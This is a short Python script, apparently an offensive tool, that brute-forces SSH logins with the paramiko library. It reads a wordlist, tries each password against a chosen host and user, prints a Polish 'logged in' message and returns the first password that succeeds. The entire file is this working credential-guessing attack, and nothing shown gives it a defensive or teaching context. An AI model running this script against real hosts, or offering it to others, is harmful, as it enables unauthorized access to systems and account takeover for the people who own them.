import paramiko

def ssh_bruteforce(host, username, wordlist_path, port=22):
    with open(wordlist_path) as f:
        for line in f:
            password = line.strip()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
                print(f"[+] SSH Zalogowano: {username}:{password}")
                return password
            except paramiko.AuthenticationException:
                pass
            finally:
                client.close()

    return None
